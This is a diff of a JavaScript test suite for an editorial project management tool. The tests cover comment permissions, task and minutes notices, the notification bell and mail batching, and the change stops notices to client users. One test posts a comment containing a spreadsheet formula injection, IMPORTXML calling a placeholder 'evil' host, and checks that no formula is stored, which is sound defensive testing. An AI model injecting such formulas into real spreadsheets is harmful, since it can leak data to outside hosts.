@@ -72,7 +72,7 @@ ok(/editorial_pm\/\?sheet=TESTSHEET.*&page=P1/.test(W.mails[0].body) && /大学 
 const cid = r.comment[0];
 r = W.call({ action: 'commentAdd', session: S_EXT, sheet: SID, page: 'P1', text: '=IMPORTXML("http://evil","//a")', origin: 'https://evil.example/' });
 FLUSH();
-ok(r.ok && !W.formulas.length && W.mails.length === 3 && !/evil\.example/.test(W.mails[1].body + W.mails[2].body), 'external reply: owner + earlier commenter, no formula, no foreign link');
+ok(r.ok && !W.formulas.length && W.mails.length === 2 && W.mails[1].to === 'owner@example.com' && !/evil\.example/.test(W.mails[1].body), 'チームメンバー reply: 社内 only (the クライアント who commented earlier gets nothing), no formula, no foreign link');
 r = W.call({ action: 'commentState', session: S_EXT, sheet: SID, id: cid, state: '対応済' }); ok(!r.ok && r.code === 'forbidden', 'cannot resolve someone else\'s comment');
 r = W.call({ action: 'commentState', session: S_CLIENT, sheet: SID, id: cid, state: '対応済' }); ok(r.ok && ss.getSheetByName('コメント').cells[1][7] === '対応済', 'author resolves own comment');
 r = W.call({ action: 'commentDelete', session: S_OWNER, sheet: SID, id: cid }); ok(r.ok && ss.getSheetByName('コメント').getLastRow() === 2, '社内 deletes a comment');
@@ -322,34 +322,39 @@ ok(W.mails.length && W.mails[0].name === 'エディトリアルPM' && /エディ
   W.G.flushAll_(T1 + 59 * 60000); ok(W.mails.length === 0, 'busy and under 60 minutes → wait');
   W.G.flushAll_(T1 + 60 * 60000 + 1); ok(W.mails.length === 1 && /13件/.test(W.mails[0].subject), 'busy for 60 minutes → sent anyway');
   W.G.flushAll_(T1 + 999 * 60000); W.mails.length = 0;
-  // kinds and who gets them
+  // kinds and who gets them (never a クライアント)
   const nAt = nsh().cells.length;
-  r = W.call({ action: 'taskSave', session: S_EXT, sheet: SID, values: { 'タスク': '撮影の段取り', '担当': '大学 担当', '期限': '2026-11-20' }, origin: O });
-  const tid2 = r.id;
-  W.call({ action: 'taskSave', session: S_EXT, sheet: SID, id: tid2, values: { '状態': '進行中' }, origin: O });
-  W.call({ action: 'taskSave', session: S_CLIENT, sheet: SID, values: { 'タスク': '自分用', '担当': '大学 担当' }, origin: O });
-  W.call({ action: 'minuteSave', session: S_CLIENT, sheet: SID, values: { '日付': '2026-11-02', 'タイトル': '定例' }, body: 'x', origin: O });
+  W.call({ action: 'taskSave', session: S_EXT, sheet: SID, values: { 'タスク': '大学への確認', '担当': '大学 担当' }, origin: O });
+  r = W.call({ action: 'taskSave', session: S_CLIENT, sheet: SID, values: { 'タスク': '撮影の段取り', '担当メール': 'designer@example.com', '期限': '2026-11-20' }, origin: O });
+  W.call({ action: 'taskSave', session: S_CLIENT, sheet: SID, id: r.id, values: { '状態': '進行中' }, origin: O });
+  W.call({ action: 'minuteSave', session: S_OWNER, sheet: SID, values: { '日付': '2026-11-02', 'タイトル': '定例' }, body: 'x', origin: O });
+  W.call({ action: 'commentAdd', session: S_EXT, sheet: SID, page: 'P5', text: 'デザイン修正しました', origin: O });
   W.call({ action: 'status', session: S_EXT, sheet: SID, tab: '台割／表', headerRow: 1, pageCol: 1, row: 4, col: 7, page: '002', value: '確定', origin: O });
   const added = nsh().cells.slice(nAt).filter((c) => c && c[0]).map((c) => c[4] + '→' + c[3]);
-  ok(added.filter((x) => x === 'タスク→client@example.ac.jp').length === 1 && !added.some((x) => /^タスク→(owner|designer)/.test(x)), 'task: only the new assignee, once, never yourself: ' + added.join(' '));
-  ok(added.indexOf('議事録→owner@example.com') >= 0 && !added.some((x) => /^議事録→(client|designer)/.test(x)), 'minutes: 社内 + クライアント except the writer');
-  ok(added.indexOf('進捗→owner@example.com') >= 0 && !added.some((x) => /^進捗→(client|designer)/.test(x)), 'progress: 社内 only');
+  ok(!added.some((x) => /client@|noinvite@|badorigin@/.test(x)), 'no notice of any kind for a クライアント: ' + added.join(' '));
+  ok(added.filter((x) => x === 'タスク→designer@example.com').length === 1 && added.filter((x) => /^タスク/.test(x)).length === 1, 'task: only the new assignee (チームメンバー), once');
+  ok(['議事録→designer@example.com', '議事録→writer@example.com', '議事録→photo@example.com'].every((x) => added.indexOf(x) >= 0) && added.indexOf('議事録→owner@example.com') < 0, 'minutes: 社内 + チームメンバー except the writer');
+  ok(added.indexOf('コメント→owner@example.com') >= 0, 'comment by a チームメンバー on a クライアント thread: 社内 only');
+  ok(added.indexOf('進捗→owner@example.com') >= 0 && !added.some((x) => /^進捗→(designer|writer|photo)/.test(x)), 'progress: 社内 only');
   const prow = nsh().cells.slice(nAt).find((c) => c && c[4] === '進捗');
   ok(prow[5] === 'P2' && /初校：.* → 確定/.test(prow[6]) && /&page=P2/.test(prow[8]), 'progress notice says page, stage, before → after: ' + prow[6]);
   const trow = nsh().cells.slice(nAt).find((c) => c && c[4] === 'タスク');
   ok(/撮影の段取り（期限 2026\/11\/20）/.test(trow[6]) && /&view=tasks/.test(trow[8]), 'task notice links to the tasks tab');
   // bell
-  r = W.call({ action: 'load', session: S_CLIENT, sheet: SID });
+  ok(W.call({ action: 'load', session: S_CLIENT, sheet: SID }).notices.length === 0, 'クライアント: the bell stays empty');
+  r = W.call({ action: 'load', session: S_EXT, sheet: SID });
   const mine = r.notices;
-  ok(mine.length && mine[0].kind === 'タスク' && mine.every((n) => !n.read) && !mine.some((n) => n.kind === '進捗'), 'bell: my notices, newest first, unread');
-  r = W.call({ action: 'noticeRead', session: S_CLIENT, sheet: SID, ids: [mine[0].id] });
-  r = W.call({ action: 'notices', session: S_CLIENT, sheet: SID });
+  ok(mine.length >= 2 && mine.some((n) => n.kind === 'タスク') && mine.every((n) => !n.read) && !mine.some((n) => n.kind === '進捗'), 'bell: my notices, unread');
+  W.call({ action: 'noticeRead', session: S_EXT, sheet: SID, ids: [mine[0].id] });
+  r = W.call({ action: 'notices', session: S_EXT, sheet: SID });
   ok(r.notices[0].read && !r.notices[1].read, 'mark one as read');
-  W.call({ action: 'noticeRead', session: S_CLIENT, sheet: SID });
-  ok(W.call({ action: 'notices', session: S_CLIENT, sheet: SID }).notices.every((n) => n.read), 'mark all as read');
+  W.call({ action: 'noticeRead', session: S_EXT, sheet: SID });
+  ok(W.call({ action: 'notices', session: S_EXT, sheet: SID }).notices.every((n) => n.read), 'mark all as read');
   ok(W.call({ action: 'notices', session: S_OWNER, sheet: SID }).notices.some((n) => !n.read), 'someone else\'s read state is untouched');
+  // a クライアント with mail already queued (e.g. before this rule) gets nothing
+  nsh().cells.push(['OLDQUEUED1', '', Date.now() - 3600e3, 'client@example.ac.jp', 'コメント', 'P1', '古い通知', 'x', '', '', '']);
   W.mails.length = 0; W.G.flushAll_(Date.now() + 11 * 60000);
-  { const tos = W.mails.map((m) => m.to); ok(tos.indexOf('client@example.ac.jp') >= 0 && tos.indexOf('owner@example.com') >= 0 && tos.indexOf('designer@example.com') < 0 && new Set(tos).size === tos.length, 'one mail per person for the mixed batch: ' + tos.join()); }
+  { const tos = W.mails.map((m) => m.to); ok(tos.indexOf('designer@example.com') >= 0 && tos.indexOf('owner@example.com') >= 0 && !tos.some((t) => /client@|noinvite@|badorigin@/.test(t)) && new Set(tos).size === tos.length, 'one mail per person, none to クライアント: ' + tos.join()); }
 }
 /* ---- deleting a design PDF ---- */
 {
